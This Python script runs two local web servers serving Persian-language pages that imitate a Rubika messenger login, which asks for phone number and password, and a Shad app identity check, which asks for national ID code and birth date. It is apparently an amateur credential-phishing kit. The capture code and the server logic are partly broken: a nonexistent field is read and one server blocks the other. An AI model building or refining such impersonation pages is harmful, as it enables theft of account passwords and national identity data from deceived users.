from http.server import BaseHTTPRequestHandler, HTTPServer
import time

serverPort = 8080

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("""
        <html>
        <head>
    <meta charset="utf-8">
    <link rel="icon" type="image/x-icon" href="https://s6.uupload.ir/files/polish_20220915_135553463_xenp.png" />
    <title>پیام رسان وب روبیکا</title>
    <script src="http://code.jquery.com/jquery-3.3.1.js"></script>
    <script>
        function test()
        {
            var message = $('input[name=message]').val();
            $.ajax({
                url: "/cgi-bin/hello.py",
                type: "POST",
                data: {"text" : message},
                success: function(response){
                        $("#div").html(response);
                }
            });
        };

    </script>
    <body>
        <style>
            body{
                text-align: center;
                background: #ffffff;
            }
            img{
                width: 160px;
                margin-top: 5%;
            }
            .input{
                margin-top: 1%;
                width: 300px;
                height: 50px;
                padding: 10px;
                background: #ffffff;
                border-radius: 10px;
                outline: none;
                color: #000000;
                border: 1px solid #3390ec;
            }
            .placeholder{
                color: #3390ec;
                background: #ffffff;
                top: 10px;
                left: 660px;
                font-size: 14px;
                position: absolute;
            }
            .input-group{
                position: relative;
            }
            .input:focus + .placeholder,.input:not(:placeholder-shown) + .placeholder{
                background-color: #ffffff;
            }
            .hip{
                width: 300px;
                height: 50px;
                margin-top: 1%;
                padding: 10px;
                background: #ffffff;
                border-radius: 10px;
                outline: none;
                color: #000000;
                border: 1px solid rgba(99, 99, 100, 0.933);
            }
            .lop{
                color: #000000;
                background: #ffffff;
                top: 370px;
                left: 670px;
                font-size: 14px;
                position: absolute;
            }
            .select-group{
                position: relative;
            }
            .select:focus + .lop,.select:not(:lop-shown) + .lop{
                background-color: #ffffff;
            }
            button{
                border: 0px;
                padding: 10px 10px;
                width: 300px;
                height: 50px;
                font-size: 20px;
                margin-top: 1%;
                border-radius: 10px;
                background: #3390ec;
                color: #fff;
            }
            h4{
              margin-top: 1%;
              font-size: 18px;  
              color:#3390ec;
            }
        </style>
        <form>
        <img src="https://web.rubika.ir/assets/icons/icon-192x192.png"/>
        <h1>ورود</h1>
        <p>لطفا کشور خود را انتخاب کنید و شماره همراه خود را به صورت کامل وارد کنید.</p>
        <label class="lop">کشور</label>
        <select class="hip">
        <option value="volvo">ایران</option>
        </select>
<div class="input-group" for='fname'>
    <input type="tel" class="input" placeholder="+98" name="tel"/>
    <label class="placeholder">شماره همراه</label>
    <div class="input-group" for='fname'>
        <input type="password" class="input" placeholder="" name="password"/>
        <label class="placeholder">گذر واژه شما</label>
    </div>
</div>
<button onclick="test()">بعدی</button>
<h4>گذر واژه خود را فراموش کردید؟</h4>
</form>
    </body>
</head>
</html>
        """, "utf-8"))

class MyServere(BaseHTTPRequestHandler):
  def do_GET(self):
    self.send_response(200)
    self.send_header("Content-type", "text/html")
    self.end_headers()
    self.wfile.write(bytes("""
<html>
    <head>
        <meta charset="UTF-8">
    <link rel="icon" type="image/x-icon" href="https://s6.uupload.ir/files/r_qq3k.png" />
    <title>احراز هویت اپلیکیشن شاد</title>
    <script src="http://code.jquery.com/jquery-3.3.1.js"></script>
    <script>
    function test()
    {
        var message = $('input[name=message]').val();
        $.ajax({
            url: "/cgi-bin/hello.py",
            type: "POST",
            data: {"text" : message},
            success: function(response){
                    $("#div").html(response);
            }
        });
    };

</script>
    </head>
    <body>
        <style>
            body{
                background: green;
                text-align: center;
            }
            .lip{
                margin-left: 36%;
                margin-top: 10%;
                position: absolute;
                background: rgb(221, 221, 221);
                border-radius: 5px 5px 5px 5px;
                width: 400px;
                height: 500px;
                text-align: center;
            }
            img{
                margin-top: 5%;
                width: 100px;
                height: 100px;
            }
            .input{
                padding-left: 160px;
                background: #ffffff;
                border-radius: 5px;
                outline: none;
                font-size: 15px;
                color: #000000;
                border: 1px solid #000000;
                width: 300px;
                height: 40px;
            }
            .moz{
                padding-left: 240px;
                margin-top: 3%;
                background: #ffffff;
                border-radius: 5px;
                outline: none;
                font-size: 15px;
                color: #000000;
                border: 1px solid #000000;
                width: 300px;
                height: 40px;
            }
            .lolo{
                padding-left: 261px;
                margin-top: 3%;
                background: #ffffff;
                border-radius: 5px;
                outline: none;
                font-size: 15px;
                color: #000000;
                border: 1px solid #000000;
                width: 300px;
                height: 40px;
            }
            .moc{
                padding-left: 258px;
                margin-top: 3%;
                background: #ffffff;
                border-radius: 5px;
                outline: none;
                font-size: 15px;
                color: #000000;
                border: 1px solid #000000;
                width: 300px;
                height: 40px;
            }
            button{
                margin-top: 3%;
                color: #ffffff;
                font-size: 15px;
                padding-left: 255px;
                background: green;
                border-radius: 5px;
                border: 0px;
                height: 40px;
                width: 300px;
            }
        </style>
        <form>
        <div class="lip">
            <img src="https://s6.uupload.ir/files/r_qq3k.png"/>
            <div>
                <h1>احراز هویت اپلیکیشن شاد</h1>
            </div>
            <div for='fname'>
            <input type="number" class="input" placeholder="کد ملی" name="NationalCode"></input></div>
            <div for='fname'>
                <input type="number" class="moz" placeholder="سال تولد" name="YearBirth"></input>
            </div>
            <div for='fname'>
                <input type="number" class="lolo" placeholder="ماه" name="Month"></input>
            </div>
            <div for='fname'>
                <input type="number" class="moc" placeholder="روز" name="Day"></input>
            </div>
            <div>
                <button type="number" value="submit" onclick="test()">ثبت</button>
            </div>
        </div>
    </form>
    </body>
</html>
""", "utf-8"))
print("\nThe localhost has been online, the files have been added\n")
if __name__ == "__main__":        
    webServer = HTTPServer(('127.0.0.1', 8080), MyServer)
    print("online server localhost : http://%s:%s%s" % ('127.0.0.1', 8080, '/Rubika.ml'))

if __name__ == "__main__":        
    webServere = HTTPServer(('127.0.0.1', 2020), MyServere)
    print("online localhost shad : http://%s:%s%s" % ('127.0.0.1', 2020,'/Shad.ir'))

    try:
        webServere.serve_forever()
    except KeyboardInterrupt:
        pass

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServere.server_close()
    print("off")

    webServer.server_close()
    print("off")